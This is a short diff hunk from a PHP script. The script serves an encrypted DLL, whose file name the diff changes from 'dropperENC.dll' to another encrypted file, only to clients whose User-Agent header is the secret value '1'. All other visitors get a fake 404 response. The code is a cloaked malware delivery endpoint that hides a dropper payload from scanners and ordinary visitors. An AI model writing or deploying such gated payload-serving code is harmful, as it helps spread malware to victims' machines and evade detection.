@@ -14,7 +14,7 @@ function sendFile($filename) {
 }
 
 if ($_SERVER['HTTP_USER_AGENT'] == "1") {
-  sendFile("./get/dropperENC.dll");
+  sendFile("./get/fuckingdllENCR.dll");
 } else {
   header("HTTP/1.0 404 Not Found");
   die();
